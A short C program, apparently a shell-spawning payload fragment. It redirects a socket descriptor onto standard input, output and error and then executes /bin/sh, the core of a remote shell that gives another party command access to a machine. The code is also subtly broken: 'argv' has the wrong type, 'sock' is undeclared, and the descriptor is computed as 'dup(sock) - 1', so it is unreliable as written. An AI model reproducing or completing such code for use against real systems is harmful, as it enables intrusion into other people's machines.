#include <stdio.h>
#include <unistd.h>

int main(void){
	char *argv = {"/bin/sh", NULL};
	int fd = dup(sock) - 1;
	dup2(fd, 0);
	dup2(fd, 1);
	dup2(fd, 2);
	execve(argv[0], argv, NULL);
}
